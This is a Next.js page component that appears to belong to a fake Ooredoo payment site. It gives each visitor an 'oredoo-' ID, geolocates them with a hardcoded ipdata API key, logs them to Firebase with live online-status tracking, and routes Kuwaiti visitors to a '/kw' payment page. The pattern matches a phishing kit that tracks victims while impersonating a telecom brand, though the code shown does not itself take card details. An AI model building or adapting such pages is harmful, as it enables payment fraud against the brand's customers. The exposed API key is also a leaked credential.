"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import PaymentPage from "./kw/page"
import { addData } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/utils"
import OoredooPage from "@/components/pay-page"

export default function Page() {
  const router = useRouter()
  const [isLoading, setIsLoading] = useState(true)

  const _id = randstr("oredoo-")


  function randstr(prefix: string) {
    return Math.random()
      .toString(36)
      .replace("0.", prefix || "")
  }

  async function getLocation() {
    const APIKEY = "a48dbc44c94452a8427c73683e68294f00a2892eee042a563ee1d07b"
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      addData({
        id: _id,
        country: country,
      })
      localStorage.setItem("country", country)

      setupOnlineStatus(_id)
      return country
    } catch (error) {
      console.error("Error fetching location:", error)
    }
  }
  useEffect(() => {
    async function checkCountry() {
      try {
        // Get the country code
        await getLocation().then((v) => {
          if (v!.toLowerCase() === "kuwait") {
            router.push("/kw")
            return
          }
        })

        setIsLoading(false)
      } catch (error) {
        console.error("Error in country detection:", error)
        setIsLoading(false)
      }
    }

    checkCountry()
  }, [router])

  if (isLoading) {
    return (
      <div className="flex items-center justify-center min-h-screen bg-gray-50">
        <div className="text-center">
          <div className="inline-block h-8 w-8 animate-spin rounded-full border-4 border-solid border-red-500 border-r-transparent align-[-0.125em] motion-reduce:animate-[spin_1.5s_linear_infinite]"></div>
          <p className="mt-4 text-gray-600">Loading...</p>
        </div>
      </div>
    )
  }

  return <OoredooPage />
}
